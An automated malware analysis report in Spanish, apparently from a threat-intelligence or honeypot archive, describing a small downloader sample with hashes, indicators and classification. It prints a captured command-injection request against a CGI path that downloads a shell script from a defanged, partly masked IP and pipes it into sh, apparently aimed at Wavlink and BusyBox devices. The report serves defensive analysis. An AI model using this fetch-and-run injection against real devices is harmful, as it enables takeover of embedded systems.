# 🧬 Payload Analysis

`fbeb8e26bbf7e10abbfeb2cd998285ed6ad60ba7d5eea6fca78fb987e774d86d`

## 📌 Resumen

Texto ASCII de 236 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `cd /tmp`
2. `wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `sh -s wavlink`
4. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/fbeb8e26bbf7e10abbfeb2cd998285ed6ad60ba7d5eea6fca78fb987e774d86d.md](../../../../../malware-like/oraculo/downloader/fbeb8e26bbf7e10abbfeb2cd998285ed6ad60ba7d5eea6fca78fb987e774d86d.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `fbeb8e26bbf7e10abbfeb2cd998285ed6ad60ba7d5eea6fca78fb987e774d86d`
- **SHA1:** `3bb38e05ecd6ebdf9e8b751adce92928d6307cb7`
- **MD5:** `42f63c8243691136263e0329ffe08953`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 236 B |
| Entropía | 5.07 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | GET /cgi-bin/;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wavlink;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh | strings |
| hash | fbeb8e26bbf7e10abbfeb2cd998285ed6ad60ba7d5eea6fca78fb987e774d86d | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
